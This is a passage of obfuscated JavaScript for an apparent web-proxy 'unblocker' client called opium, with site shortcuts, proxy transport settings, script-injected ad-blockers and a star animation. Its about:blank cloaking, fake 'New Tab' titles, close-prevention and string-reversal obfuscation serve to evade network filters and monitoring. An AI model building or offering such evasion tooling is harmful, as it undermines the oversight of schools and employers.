window['dataLayer'] = window['dataLayer'] || [];
window['gtag'] = function() {
    dataLayer['push'](arguments);
};
gtag("js", new Date());
gtag("gifnoc".split("").reverse().join(""), "G-1CC1LKMRS6");
(function() {
    var _0xab281g = (323051 ^ 323051) + (684281 ^ 684287);
    var s = document['createElement']("script");
    _0xab281g = 225851 ^ 225849;
    s['async'] = !![];
    s['src'] = "https://www.googletagmanager.com/gtag/js?id=G-1CC1LKMRS6";
    document['head']['appendChild'](s);
})();
var _0x931b = (908620 ^ 908619) + (595033 ^ 595033);
const sjEncode = url => frame['prefix'] + controller['config']['codec']['encode'](url);
_0x931b = (840753 ^ 840759) + (251714 ^ 251719);
const SHORTCUTS = [{
    'label': "YouTube",
    "url": "https://youtube.com/"
}, {
    'label': "TikTok",
    "url": "https://www.tiktok.com/foryou"
}, {
    'label': 'Geforce Now',
    "url": 'https://play.geforcenow.com/mall/'
}, {
    "label": 'Roblox',
    "faviconHost": "https://www.roblox.com/",
    'url': "https://nowgg.fun/apps/a/19900/b.html"
}, {
    'label': "Geometry Dash",
    'url': "https://webdashers.dev/",
    "faviconUrl": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdw5uFI0cIdPEEfg8nXpx-UeHx2SRH5tG-e3OhSB0dfQ&s"
}, {
    "label": 'Kick',
    "url": 'https://kick.com/'
}, {
    "label": "Twitch",
    'url': "https://twitch.tv"
}, {
    'label': "Snapchat",
    'url': "https://www.snapchat.com/web"
}, {
    'label': 'Instagram',
    'url': "https://instagram.com"
}, {
    "label": "Discord",
    "url": "https://discord.com/app"
}, {
    'label': "Movies",
    'url': "https://zstream.mov/",
    "faviconUrl": "https://cdn-icons-png.flaticon.com/512/10351/10351880.png"
}, {
    'label': "Music",
    "url": "https://monochrome.tf/",
    "faviconUrl": "https://cdn-icons-png.flaticon.com/512/461/461146.png"
}];
const ra = [{
    "name": "Google",
    'url': "https://www.google.com/search?q="
}, {
    'name': "DuckDuckGo",
    'url': "https://duckduckgo.com/?q="
}, {
    'name': "Bing",
    "url": "https://www.bing.com/search?q="
}, {
    'name': "Brave",
    "url": "https://search.brave.com/search?q="
}, {
    'name': "Yahoo",
    'url': "https://search.yahoo.com/search?p="
}, {
    'name': "Startpage",
    "url": "https://www.startpage.com/sp/search?q="
}, {
    'name': "Ecosia",
    'url': "https://www.ecosia.org/search?q="
}, {
    'name': "Ask",
    "url": "https://www.ask.com/web?q="
}];
var _0x6f1g7g = (846693 ^ 846688) + (802707 ^ 802705);
const SETTINGS = {
    "Appearance": {
        "Stars": {
            'type': "toggle",
            'default': !![],
            "callback": val => {
                starsEnabled = val;
            }
        },
        'Shooting Stars': {
            'type': "toggle",
            'default': !![],
            "callback": val => {
                shootingStarsEnabled = val;
            }
        },
        "Prevent Close": {
            "type": 'toggle',
            'default': !![],
            'callback': val => {
                preventCloseEnabled = val;
            }
        },
        "Title Changer": {
            "type": "toggle",
            'default': !![],
            'callback': (val, init) => {
                titleChangerEnabled = val;
                if (init) return;
                if (!val) {
                    try {
                        clearTimeout(focusTimeout);
                    } catch {}
                    focusTimeout = null;
                    document['title'] = "muipo".split("").reverse().join("");
                } else if (document['hidden']) {
                    document['title'] = "New Tab";
                }
            }
        }
    },
    'Privacy': {
        "PrivateDNS (AdBlock, AntiTracking, AntiMalware)": {
            "type": "toggle",
            'default': !![],
            'callback': (val, init) => {
                localStorage['ABDE'] = val;
                if (!init) {
                    allowUnload = !![];
                    location['reload']();
                }
            }
        },
        "Clientsided Ad Block": {
            "type": "toggle",
            'default': !![],
            'callback': val => {}
        },
        "About:Blank Cloak": {
            'type': "toggle",
            'default': false,
            "callback": (val, init) => {
                if (init) return;
                if (val) triggerCloak();
            }
        }
    },
    "Proxy": {
        "Transport": {
            "type": "dropdown",
            'default': {
                "name": "libcurl",
                'src': getAsset("curl/index.mjs")
            },
            'options': [{
                "name": "libcurl",
                'src': getAsset("curl/index.mjs")
            }, {
                "name": "epoxy",
                'src': getAsset("sjm.xedni/xop".split("").reverse().join(""))
            }],
            'callback': async val => {
                try {
                    if (localStorage['transport'] === val['src']) return;
                    localStorage['transport'] = val['src'];
                    const {
                        "default": TransportClient
                    } = await import(val['src']);
                    transport = new TransportClient({
                        "wisp": window['wispServer']
                    });
                    await initTransport(transport);
                    controller['setTransport'](transport);
                } catch {}
            }
        },
        "Search Engine": {
            "type": 'dropdown',
            'default': {
                "name": "Brave",
                "url": "https://search.brave.com/search?q="
            },
            'options': ra,
            'callback': val => {}
        }
    },
    "Advanced": {
        "Force Update/Clear Data": {
            'type': "button",
            "label": 'Clear',
            'action': async () => {
                if (!confirm("This will clear all data and force update the client. Are you sure?")) return;
                try {
                    var _0x34g = (745316 ^ 745325) + (958811 ^ 958812);
                    const names = await caches['keys']();
                    _0x34g = (781347 ^ 781350) + (435473 ^ 435472);
                    await Promise['all'](names['map'](n => caches['delete'](n)));
                } catch (e) {}
                try {
                    localStorage['clear']();
                } catch (e) {}
                try {
                    sessionStorage['clear']();
                } catch (e) {}
                try {
                    document['cookie']['split'](";")['forEach'](c => {
                        var _0xd01f9e = (944647 ^ 944644) + (564590 ^ 564585);
                        const name = c['split']("=")[881820 ^ 881820]['trim']();
                        _0xd01f9e = (932096 ^ 932102) + (894286 ^ 894285);
                        var _0x9ec5ac = (912273 ^ 912279) + (219500 ^ 219501);
                        const domain = location['hostname'];
                        _0x9ec5ac = 635851 ^ 635852;
                        const pathParts = location['pathname']['split']("/");
                        for (let i = pathParts['length']; i >= (900061 ^ 900061); i--) {
                            let _0x02cdba;
                            const path = pathParts['slice'](255960 ^ 255960, i)['join']("/") || "/";
                            _0x02cdba = "ogijjd".split("").reverse().join("");
                            document['cookie'] = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=${path};domain=${domain}`;
                            document['cookie'] = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=${path}`;
                        }
                    });
                } catch (e) {}
                try {
                    const regs = await navigator['serviceWorker']['getRegistrations']();
                    await Promise['all'](regs['map'](r => r['unregister']()));
                } catch (e) {}
                try {
                    const forceDelDb = name => new Promise(res => {
                        const open = indexedDB['open'](name);
                        open['onsuccess'] = () => {
                            open['result']['close']();
                            deleteTs();
                        };
                        open['onerror'] = deleteTs;
                        const deleteTs = () => {
                            let _0x7aa86a;
                            const req = indexedDB['deleteDatabase'](name);
                            _0x7aa86a = (251311 ^ 251311) + (818950 ^ 818951);
                            req['onsuccess'] = req['onerror'] = req['onblocked'] = res;
                        };
                    });
                    await forceDelDb("__scramjet_controller");
                    if (indexedDB['databases']) {
                        const dbs = await indexedDB['databases']();
                        await Promise['all'](dbs['map'](db => forceDelDb(db['name'])));
                    }
                } catch (e) {}
                allowUnload = !![];
                alert("done! after the page reloads, please wait for the client to update and load");
                location['reload'](625919 ^ 625918);
            }
        }
    }
};
_0x6f1g7g = (587789 ^ 587781) + (228724 ^ 228733);
const EXTENSIONS = [{
    'name': "Youtube Ad Blocker",
    'domain': "youtube.com",
    'code': "(function() { 'use strict'; var cssArrObject = ['#masthead-ad', 'ytd-rich-item-renderer.style-scope.ytd-rich-grid-row #content:has(.ytd-display-ad-renderer)', '.video-ads.ytp-ad-module', 'tp-yt-paper-dialog:has(yt-mealbar-promo-renderer)', 'ytd-engagement-panel-section-list-renderer[target-id=\"engagement-panel-ads\"]', '#related #player-ads', '#related ytd-ad-slot-renderer', 'ytd-ad-slot-renderer', 'yt-mealbar-promo-renderer', 'ytd-popup-container:has(a[href=\"/premium\"])', 'ad-slot-renderer', 'ytm-companion-ad-renderer', '#related #-ad-']; function removeNonVideoAds(arry) { arry.forEach((selector, index) => { arry[index] = `${selector}{display:none!important}`; }); const premiumContainers = [...document.querySelectorAll('ytd-popup-container')]; const matchingContainers = premiumContainers.filter(container => container.querySelector('a[href=\"/premium\"]')); if (matchingContainers.length > 0) { matchingContainers.forEach(container => container.remove()); } const backdrops = document.querySelectorAll('tp-yt-iron-overlay-backdrop'); const targetBackdrop = Array.from(backdrops).find((backdrop) => backdrop.style.zIndex === '2201'); if (targetBackdrop) { targetBackdrop.className = ''; targetBackdrop.removeAttribute('opened'); } let style = document.createElement('style'); (document.head || document.body).appendChild(style); style.appendChild(document.createTextNode(arry.join(' '))); } function skipAd(video) { const adIndicator = document.querySelector('.ytp-ad-skip-button, .ytp-skip-ad-button, .ytp-ad-skip-button-modern, .video-ads.ytp-ad-module .ytp-ad-player-overlay, .ytp-ad-button-icon'); if (adIndicator && !window.location.href.includes('https://m.youtube.com/')) { video.muted = true; video.currentTime = video.duration - 0.1; } } function removeAdblockWarning() { var warningInterval = setInterval(function() { var popupExists = document.getElementsByClassName('style-scope ytd-popup-container').length > 0; var dismissButton = document.getElementById('dismiss-button'); var divider = document.getElementById('divider'); if (popupExists && dismissButton && divider) { setTimeout(function() { dismissButton.click(); const playButton = document.getElementsByClassName('ytp-play-button ytp-button')[0]; if (playButton) playButton.click(); clearInterval(warningInterval); }, Math.random() * 3000); } }, Math.random() * 500); } setInterval(() => { if (document.readyState !== 'loading') { removeNonVideoAds(cssArrObject); removeAdblockWarning(); var adsVideo = document.querySelector('.ad-showing video'); var mainVideo = document.querySelector('video'); if (mainVideo) { var playerStatus = { currentTime: mainVideo.currentTime, isPaused: mainVideo.paused, speed: mainVideo.playbackRate }; if (playerStatus.currentTime <= 5 && playerStatus.isPaused == true) { mainVideo.play().catch(error => { console.error('Failed to play video:', error); }); } } if (adsVideo) { skipAd(adsVideo); } } }, 500); })();"
}, {
    "name": "GeForce NOW Ad Blocker",
    'domain': ["geforcenow.com", "*.geforcenow.com"],
    'code': `(function() {
 Object.defineProperty(document, 'hidden', { get: () => false });
 
    function checkForVideo() {
        const video = document.getElementById('preStreamVideo');
        if (video) {
            video.style.width = '0.1px';
            video.style.height = '0.1px';
            video.muted = true;
            const observer = new MutationObserver(() => {
                if (!document.contains(video)) {
                    observer.disconnect();
                }
            });
            observer.observe(document.body, { childList: true, subtree: true });
        }
    }
 
    const interval = setInterval(() => {
        if (document.getElementById('preStreamVideo')) {
            clearInterval(interval);
            checkForVideo();
        }
    }, 1000);
})();`
}, {
    'name': "nowgg.fun fat fat",
    "domain": "*.ip.nowgg.fun",
    "code": `window.alert=()=>{}`,
    "prompt": false
}];
var _0xffc = (380088 ^ 380093) + (657221 ^ 657218);
const _extApproved = new Set();
_0xffc = (919698 ^ 919702) + (521258 ^ 521259);
const _extDismissed = new Set();

function _domainMatches(pattern, hostname) {
    if (pattern === "*") return !![];
    if (pattern['startsWith']("*.")) {
        const _0x3d7deg = pattern['slice'](393648 ^ 393649);
        return hostname === _0x3d7deg['slice'](507550 ^ 507551) || hostname['endsWith'](_0x3d7deg);
    }
    return hostname === pattern;
}

function _extMatchesDomain(ext, hostname) {
    const _0x4a24fa = Array['isArray'](ext['domain']) ? ext['domain'] : [ext['domain']];
    return _0x4a24fa['some'](p => _domainMatches(p, hostname));
}

function _runExtension(ext) {
    try {
        frame['element']['contentWindow']['eval'](ext?.code?.toString());
    } catch {}
}

function _showExtPrompt(ext, idx) {
    var _0xc2e = (335403 ^ 335400) + (806424 ^ 806427);
    const _0xd3ac6a = "_ep" + idx;
    _0xc2e = (438141 ^ 438141) + (854306 ^ 854307);
    if (document['getElementById'](_0xd3ac6a)) return;
    var _0xdaf = (870432 ^ 870432) + (940181 ^ 940189);
    const _0xd2ab1a = document['createElement']("div");
    _0xdaf = 'ofabli';
    _0xd2ab1a['id'] = _0xd3ac6a;
    _0xd2ab1a['className'] = "ext-prompt";
    const _0xca_0x5f2 = document['createElement']("div");
    _0xca_0x5f2['className'] = "ext-prompt-eyebrow";
    _0xca_0x5f2['textContent'] = "Extension available";
    var _0x649c = (948028 ^ 948025) + (544985 ^ 544987);
    const _0x911c = document['createElement']("div");
    _0x649c = (216211 ^ 216208) + (477508 ^ 477517);
    _0x911c['className'] = "ext-prompt-name";
    _0x911c['textContent'] = ext['name'];
    var _0xecb = (743554 ^ 743553) + (101778 ^ 101782);
    const _0xb_0x7a3 = document['createElement']("vid".split("").reverse().join(""));
    _0xecb = (684530 ^ 684528) + (689563 ^ 689563);
    _0xb_0x7a3['className'] = "noitseuq-tpmorp-txe".split("").reverse().join("");
    _0xb_0x7a3['textContent'] = "Run it on this site?";
    const _0xddfb6a = document['createElement']("div");
    _0xddfb6a['className'] = "ext-prompt-btns";
    const _0xe8848e = document['createElement']("nottub".split("").reverse().join(""));
    _0xe8848e['className'] = "sey ntb-tpmorp-txe".split("").reverse().join("");
    _0xe8848e['textContent'] = "seY".split("").reverse().join("");
    const _0x8bd2c = document['createElement']("button");
    _0x8bd2c['className'] = "on ntb-tpmorp-txe".split("").reverse().join("");
    _0x8bd2c['textContent'] = "No";
    var _0x6b470b = (115799 ^ 115799) + (773920 ^ 773922);
    const _0x1658f = () => {
        _0xd2ab1a['classList']['remove']("nepo".split("").reverse().join(""));
        _0xd2ab1a['addEventListener']("dnenoitisnart".split("").reverse().join(""), () => _0xd2ab1a['remove'](), {
            'once': !![]
        });
        setTimeout(() => _0xd2ab1a['remove'](), 149383 ^ 149209);
    };
    _0x6b470b = 'opfcec';
    _0xe8848e['onclick'] = () => {
        _0x1658f();
        _extApproved['add'](idx);
        _runExtension(ext);
    };
    _0x8bd2c['onclick'] = () => {
        _0x1658f();
        _extDismissed['add'](idx);
    };
    _0xddfb6a['appendChild'](_0xe8848e);
    _0xddfb6a['appendChild'](_0x8bd2c);
    _0xd2ab1a['appendChild'](_0xca_0x5f2);
    _0xd2ab1a['appendChild'](_0x911c);
    _0xd2ab1a['appendChild'](_0xb_0x7a3);
    _0xd2ab1a['appendChild'](_0xddfb6a);
    (shadowRoot || document['body'])['appendChild'](_0xd2ab1a);
    requestAnimationFrame(() => _0xd2ab1a['classList']['add']("open"));
}

function _checkExtensions(href, _0x9a7c1f) {
    try {
        _0x9a7c1f = new URL(href)['hostname'];
    } catch (e) {
        return;
    }
    if (!_0x9a7c1f) return;
    EXTENSIONS['forEach']((ext, i) => {
        if (ext['enabled'] === false) return;
        if (!_extMatchesDomain(ext, _0x9a7c1f)) return;
        if (_extApproved['has'](i)) {
            _runExtension(ext);
        } else if (ext['prompt'] === false) {
            _runExtension(ext);
        } else if (!_extDismissed['has'](i)) {
            _showExtPrompt(ext, i);
        }
    });
}
let frame = null;
var _0xd1b5e = (326824 ^ 326828) + (727627 ^ 727619);
let starsEnabled = !![];
_0xd1b5e = 671572 ^ 671571;
let shootingStarsEnabled = !![];
let preventCloseEnabled = !![];
let _0x6eb3b;
let titleChangerEnabled = !![];
_0x6eb3b = 424414 ^ 424415;
var allowUnload = false;
window['addEventListener']("nwodyek".split("").reverse().join(""), e => {
    return;
    if (e['ctrlKey'] && e['key']['toLowerCase']() === "r") {
        allowUnload = !![];
        setTimeout(() => {
            allowUnload = false;
        }, 944702 ^ 944598);
    }
});
window['addEventListener']("beforeunload", e => {
    if (allowUnload || !preventCloseEnabled) return;
    e['preventDefault']();
    e['returnValue'] = '';
});
var _0x0ebdd = (447431 ^ 447439) + (301119 ^ 301112);
const saved = (() => {
    try {
        return JSON['parse'](localStorage['getItem']("SETTINGS") || "}{".split("").reverse().join(""));
    } catch (e) {
        return {};
    }
})();
_0x0ebdd = (306638 ^ 306632) + (833025 ^ 833028);

function saveSettings() {
    const _0xef0e8e = {};
    Object['entries'](SETTINGS)['forEach'](([cat, s]) => {
        _0xef0e8e[cat] = {};
        Object['entries'](s)['forEach'](([k, v]) => {
            _0xef0e8e[cat][k] = v['_value'] !== undefined ? v['_value'] : v['default'];
        });
    });
    localStorage['setItem']("SETTINGS", JSON['stringify'](_0xef0e8e));
}
Object['entries'](SETTINGS)['forEach'](([cat, settings]) => {
    Object['entries'](settings)['forEach'](([key, s]) => {
        s['_value'] = saved[cat]?.[key] !== undefined ? saved[cat][key] : s['default'];
        if (s['callback']) s['callback'](s['_value'], !![]);
    });
});

function cloakAboutBlank() {
    if (window['self'] !== window['top']) return !![];
    const _0x62344g = window['open']("about:blank", "_blank");
    if (!_0x62344g) return false;
    allowUnload = !![];
    _0x62344g['document']['open']();
    _0x62344g['document']['write'](cloakWrapperHtml(window['location']['href']));
    _0x62344g['document']['close']();
    window['close']();
    location['href'] = "knalb:tuoba".split("").reverse().join("");
    setTimeout(() => {
        allowUnload = false;
    }, 386121 ^ 386977);
    return !![];
}
let cloakPending = false;

function triggerCloak() {
    if (cloakAboutBlank()) return;
    if (cloakPending) return;
    cloakPending = !![];
    var _0x58252b = (628527 ^ 628527) + (622930 ^ 622935);
    const _0xdc99f = () => {
        if (!cloakAboutBlank()) return;
        document['removeEventListener']("click", _0xdc99f, !![]);
        document['removeEventListener']("nwodyek".split("").reverse().join(""), _0xdc99f, !![]);
        document['removeEventListener']("pointerdown", _0xdc99f, !![]);
        cloakPending = false;
    };
    _0x58252b = 240651 ^ 240648;
    document['addEventListener']("kcilc".split("").reverse().join(""), _0xdc99f, !![]);
    document['addEventListener']("keydown", _0xdc99f, !![]);
    document['addEventListener']("pointerdown", _0xdc99f, !![]);
}

function cloakWrapperHtml(originalUrl, _0x11d) {
    const _0x97bb = !!SETTINGS["Appearance"]["Title Changer"]['_value'];
    _0x11d = (319953 ^ 319956) + (842919 ^ 842916);
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>New Tab</title>
<style>html,body{margin:0;padding:0;height:100vh;overflow:hidden}iframe{border:0}</style>
</head>
<body>
<iframe id="cloakFrame" width="100%" height="100%" src="${window['location']['href']}"></iframe>
<script>
(function () {
    var originalUrl = ${JSON['stringify'](originalUrl)};
    var titleChangerOnNow = ${_0x97bb};
    function applyTitle() {
        document.title = (!titleChangerOnNow || document.hidden) ? 'New Tab' : 'opium';
    }
    document.addEventListener('visibilitychange', applyTitle);
    applyTitle();
    window.addEventListener('storage', function (e) {
        if (e.key !== 'SETTINGS') return;
        var s; try { s = JSON.parse(localStorage.getItem('SETTINGS') || '{}'); } catch (err) { s = {}; }
        titleChangerOnNow = !!(s.Appearance && s.Appearance['Title Changer']);
        applyTitle();
        if (!(s.Privacy && s.Privacy['About:Blank Cloak'])) {
            try { document.getElementById('cloakFrame').contentWindow.allowUnload = true; } catch (e) {}
            window.location.href = originalUrl;
        }
    });
})();
</script>
</body>
</html>`;
}
if (window['self'] === window['top'] && SETTINGS['Privacy']['About:Blank Cloak']['_value']) {
    triggerCloak();
}
var _0x9b_0x9e9 = (198056 ^ 198060) + (692320 ^ 692327);
const taglineEl = document['getElementById']("tagline");
_0x9b_0x9e9 = (609342 ^ 609339) + (826672 ^ 826680);
const taglineLink = document['createElement']("a");
taglineLink['href'] = "tsebmuipo/gg.csd//:sptth".split("").reverse().join("");
taglineLink['target'] = "_blank";
taglineLink['rel'] = "rerreferon renepoon".split("").reverse().join("");
taglineLink['textContent'] = "tsebmuipo/gg.csd".split("").reverse().join("");
taglineEl['appendChild'](taglineLink);
let _0xffd;
const grid = document['getElementById']("shortcuts");
_0xffd = (768670 ^ 768665) + (968127 ^ 968127);
SHORTCUTS['forEach'](({
    "label": label,
    'url': url,
    'faviconHost': faviconHost,
    'faviconUrl': faviconUrl
}) => {
    let _0x2eg4d;
    const el = document['createElement']("vid".split("").reverse().join(""));
    _0x2eg4d = (464646 ^ 464645) + (500477 ^ 500479);
    el['className'] = "shortcut";
    let _0xcg890e;
    const img = document['createElement']("gmi".split("").reverse().join(""));
    _0xcg890e = (290342 ^ 290338) + (398689 ^ 398697);
    img['className'] = "shortcut-icon";
    img['alt'] = '';
    img['loading'] = "lazy";
    img['decoding'] = "async";
    img['src'] = faviconUrl || "https://www.google.com/s2/favicons?domain=" + new URL(faviconHost || url)['hostname'] + "821=zs&".split("").reverse().join("");
    img['onerror'] = () => {
        img['removeAttribute']("src");
    };
    let _0x05828e;
    const span = document['createElement']("span");
    _0x05828e = 'naoffi';
    span['textContent'] = label;
    el['appendChild'](img);
    el['appendChild'](span);
    el['onclick'] = () => navigate(url);
    grid['appendChild'](el);
});
const sidebar = document['getElementById']("settingsSidebar");
var _0xb9gc = (538648 ^ 538650) + (812905 ^ 812907);
const tabsEl = document['getElementById']("sbaTsgnittes".split("").reverse().join(""));
_0xb9gc = 824406 ^ 824405;
const panelsEl = document['getElementById']("slenaPsgnittes".split("").reverse().join(""));
let _0xc75ccd;
const categories = Object['keys'](SETTINGS);
_0xc75ccd = 'pdcfaa';
let _0x2a89f;
const sectionEls = [];
_0x2a89f = "maidhi".split("").reverse().join("");

function setActive(cat) {
    sidebar['querySelectorAll']("meti-rabedis.".split("").reverse().join(""))['forEach'](el => el['classList']['toggle']("active", el['dataset']['cat'] === cat));
    tabsEl['querySelectorAll'](".tab-item")['forEach'](el => el['classList']['toggle']("active", el['dataset']['cat'] === cat));
}
let scrollLock = false;
let scrollLockTimer = null;

function scrollToCategory(cat) {
    setActive(cat);
    var _0x_0x011 = (187035 ^ 187036) + (160061 ^ 160056);
    const _0xe6db = panelsEl['querySelector'](`[data-section="${cat}"]`);
    _0x_0x011 = (831523 ^ 831525) + (485358 ^ 485350);
    if (!_0xe6db) return;
    scrollLock = !![];
    clearTimeout(scrollLockTimer);
    var _0x82d = (145013 ^ 145008) + (264050 ^ 264049);
    const _0x181c = _0xe6db['getBoundingClientRect']();
    _0x82d = 'dkmleq';
    const _0x15_0x875 = panelsEl['getBoundingClientRect']();
    panelsEl['scrollTo']({
        "top": panelsEl['scrollTop'] + _0x181c['top'] - _0x15_0x875['top'],
        "behavior": "smooth"
    });
    scrollLockTimer = setTimeout(() => {
        scrollLock = false;
    }, 599497 ^ 599785);
}
panelsEl['addEventListener']("scroll", () => {
    if (scrollLock) return;
    const containerTop = panelsEl['getBoundingClientRect']()['top'];
    let _0xf76fe;
    let active = categories[306539 ^ 306539];
    _0xf76fe = (347010 ^ 347008) + (627641 ^ 627647);
    sectionEls['forEach'](el => {
        if (el['getBoundingClientRect']()['top'] - containerTop < (882869 ^ 882865)) active = el['dataset']['section'];
    });
    setActive(active);
});
categories['forEach']((cat, i) => {
    var _0x8ff = (343665 ^ 343668) + (881738 ^ 881736);
    const sItem = document['createElement']("vid".split("").reverse().join(""));
    _0x8ff = (997448 ^ 997455) + (361146 ^ 361144);
    sItem['className'] = "meti-rabedis".split("").reverse().join("") + (i === (225642 ^ 225642) ? "evitca ".split("").reverse().join("") : '');
    sItem['textContent'] = cat;
    sItem['dataset']['cat'] = cat;
    sItem['onclick'] = () => scrollToCategory(cat);
    sidebar['appendChild'](sItem);
    const tItem = document['createElement']("button");
    tItem['className'] = "tab-item" + (i === (440851 ^ 440851) ? "evitca ".split("").reverse().join("") : '');
    tItem['textContent'] = cat;
    tItem['dataset']['cat'] = cat;
    tItem['onclick'] = () => scrollToCategory(cat);
    tabsEl['appendChild'](tItem);
    const section = document['createElement']("div");
    section['className'] = "noitces-lenap-sgnittes".split("").reverse().join("");
    section['dataset']['section'] = cat;
    sectionEls['push'](section);
    var _0xf20e2c = (322257 ^ 322260) + (181010 ^ 181018);
    const lbl = document['createElement']("vid".split("").reverse().join(""));
    _0xf20e2c = 'qfhjdi';
    lbl['className'] = "category-label";
    lbl['textContent'] = cat;
    section['appendChild'](lbl);
    const rows = document['createElement']("vid".split("").reverse().join(""));
    rows['className'] = "category-rows";
    Object['entries'](SETTINGS[cat])['forEach'](([key, s]) => {
        const row = document['createElement']("vid".split("").reverse().join(""));
        row['className'] = "setting-row";
        var _0xc38a9g = (693449 ^ 693455) + (623510 ^ 623506);
        const label = document['createElement']("span");
        _0xc38a9g = 905223 ^ 905217;
        label['className'] = "lebal-gnittes".split("").reverse().join("");
        label['textContent'] = key;
        row['appendChild'](label);
        if (s['type'] === "toggle") {
            var _0x75c = (459259 ^ 459259) + (703741 ^ 703743);
            const btn = document['createElement']("nottub".split("").reverse().join(""));
            _0x75c = (957456 ^ 957459) + (804055 ^ 804053);
            btn['className'] = "toggle" + (s['_value'] ? "no ".split("").reverse().join("") : '');
            btn['onclick'] = () => {
                btn['classList']['toggle']("no".split("").reverse().join(""));
                s['_value'] = btn['classList']['contains']("on");
                s['callback'](s['_value']);
                saveSettings();
            };
            row['appendChild'](btn);
        } else if (s['type'] === "input") {
            const inp = document['createElement']("input");
            inp['className'] = "setting-input";
            inp['placeholder'] = key;
            inp['value'] = s['_value'] || '';
            inp['onchange'] = () => {
                s['_value'] = inp['value'];
                s['callback'](inp['value']);
                saveSettings();
            };
            row['appendChild'](inp);
        } else if (s['type'] === "nottub".split("").reverse().join("")) {
            const btn = document['createElement']("nottub".split("").reverse().join(""));
            btn['className'] = "ntb-noitca-gnittes".split("").reverse().join("");
            btn['textContent'] = s['label'];
            btn['onclick'] = () => s['action']();
            row['appendChild'](btn);
        } else if (s['type'] === "dropdown") {
            let _0x08ea;
            const sel = document['createElement']("tceles".split("").reverse().join(""));
            _0x08ea = "coinjb".split("").reverse().join("");
            sel['className'] = "setting-select";
            s['options']['forEach'](opt => {
                const o = document['createElement']("noitpo".split("").reverse().join(""));
                o['textContent'] = opt['name'];
                o['value'] = JSON['stringify'](opt);
                if (opt['name'] === s['_value']?.name) o['selected'] = !![];
                sel['appendChild'](o);
            });
            sel['onchange'] = () => {
                s['_value'] = JSON['parse'](sel['value']);
                s['callback'](s['_value']);
                saveSettings();
            };
            row['appendChild'](sel);
        }
        rows['appendChild'](row);
    });
    section['appendChild'](rows);
    panelsEl['appendChild'](section);
});
const spacer = document['createElement']("vid".split("").reverse().join(""));
spacer['className'] = "settings-spacer";
panelsEl['appendChild'](spacer);

function setVh() {
    document['documentElement']['style']['setProperty']("--vh", `${window['innerHeight']*0.01}px`);
}
setVh();
window['addEventListener']("resize", setVh);
var _0x923f = (757839 ^ 757831) + (273440 ^ 273449);
let canvas = document['getElementById']("stars");
_0x923f = 149842 ^ 149840;
let ctx = canvas['getContext']("2d");
let W, H;

function resize() {
    W = canvas['width'] = window['innerWidth'];
    H = canvas['height'] = window['innerHeight'];
}
resize();
window['addEventListener']("resize", resize);
const starObjs = Array['from']({
    'length': 180
}, () => {
    var _0xbc6ad = (578698 ^ 578703) + (718732 ^ 718733);
    const base = Math['random']() * 0.28 + 0.05;
    _0xbc6ad = (144082 ^ 144087) + (521489 ^ 521495);
    return {
        'x': Math['random'](),
        'y': Math['random'](),
        'r': Math['random']() * 0.85 + 0.2,
        'base': base,
        'alpha': base,
        'blinking': Math['random']() < 0.3,
        "blinkPeak": 0,
        'blinkDir': 1,
        'blinkSpeed': 0.012 + Math['random']() * 0.022,
        "pauseMs": Math['random']() * (570548 ^ 566212)
    };
});
var _0xe_0x949 = (383009 ^ 383012) + (833431 ^ 833438);
let shoots = [];
_0xe_0x949 = (268313 ^ 268314) + (225491 ^ 225498);
const homeStateEls = ["lenap".split("").reverse().join(""), "gamesScreen", "gamePlayer", "neercSstceffe".split("").reverse().join("")]['map'](id => document['getElementById'](id));

function starsShouldRun() {
    return !document['hidden'] && document['hasFocus']() && isOpiumMenu(!![]);
}
const OPIUM_EXTERNAL_SCREENS = ["panel", "reyalPemag".split("").reverse().join("")];
const OPIUM_HOME_ONLY_SCREENS = ["gamesScreen", "effectsScreen"];

function isOpiumMenu(homePageOnly = false) {
    var _0xf2d = (898665 ^ 898671) + (173057 ^ 173064);
    const _0xd5247d = homePageOnly ? [...OPIUM_EXTERNAL_SCREENS, ...OPIUM_HOME_ONLY_SCREENS] : OPIUM_EXTERNAL_SCREENS;
    _0xf2d = (651003 ^ 651006) + (526681 ^ 526682);
    return !_0xd5247d['some'](id => document['getElementById'](id)?.classList.contains("open"));
}
var _0xbf_0x5a2 = (919590 ^ 919589) + (269766 ^ 269765);
const navActiveMap = [
    ["gamesScreen", "navGames"],
    ["neercSstceffe".split("").reverse().join(""), "navEffects"],
    ["settingsScreen", "sgnitteSvan".split("").reverse().join("")]
];
_0xbf_0x5a2 = 353886 ^ 353879;

function updateNavActive() {
    navActiveMap['forEach'](([screenId, navId]) => {
        var _0xf6569d = (710279 ^ 710286) + (587988 ^ 587989);
        const _0x15d = document['getElementById'](screenId);
        _0xf6569d = 692389 ^ 692385;
        const _0x984aaf = document['getElementById'](navId);
        if (_0x15d && _0x984aaf) _0x984aaf['classList']['toggle']("active", _0x15d['classList']['contains']("open"));
    });
}
updateNavActive();
let starsRafPending = false;
let last = 500741 ^ 500741;
var _0x43af3b = (905199 ^ 905196) + (674731 ^ 674732);
let starsGen = 284505 ^ 284505;
_0x43af3b = (657608 ^ 657610) + (548421 ^ 548421);
let _0xb1e5e;
let starsActive = null;
_0xb1e5e = (392077 ^ 392074) + (789609 ^ 789600);

function stopStars() {
    starsGen++;
    starsRafPending = false;
    last = 565496 ^ 565496;
    shoots = [];
    if (W && H) ctx['clearRect'](168269 ^ 168269, 766287 ^ 766287, W, H);
}

function startStars() {
    if (starsRafPending) return;
    starsRafPending = !![];
    const _0x16_0x5fc = starsGen;
    requestAnimationFrame(ts => doFrame(ts, _0x16_0x5fc));
}

function updateStarsActive() {
    const _0x65da = starsShouldRun();
    if (_0x65da === starsActive) return;
    starsActive = _0x65da;
    if (_0x65da) {
        startStars();
        if (!shootTimer) scheduleShoot();
    } else {
        stopStars();
    }
}

function spawnShoot() {
    const _0xcc5d = Math['random']() * W * 1.4 - W * 0.2;
    const _0xf469fb = Math['random']() * H * 0.5;
    const _0x6d95a = Math['PI'] / (783049 ^ 782973) * ((984270 ^ 984258) + Math['random']() * (745920 ^ 745942));
    var _0xf6c5c = (437177 ^ 437178) + (686256 ^ 686257);
    const _0xd0742d = (536802 ^ 536805) + Math['random']() * (948068 ^ 948076);
    _0xf6c5c = (858388 ^ 858386) + (573530 ^ 573535);
    shoots['push']({
        'x': _0xcc5d,
        'y': _0xf469fb,
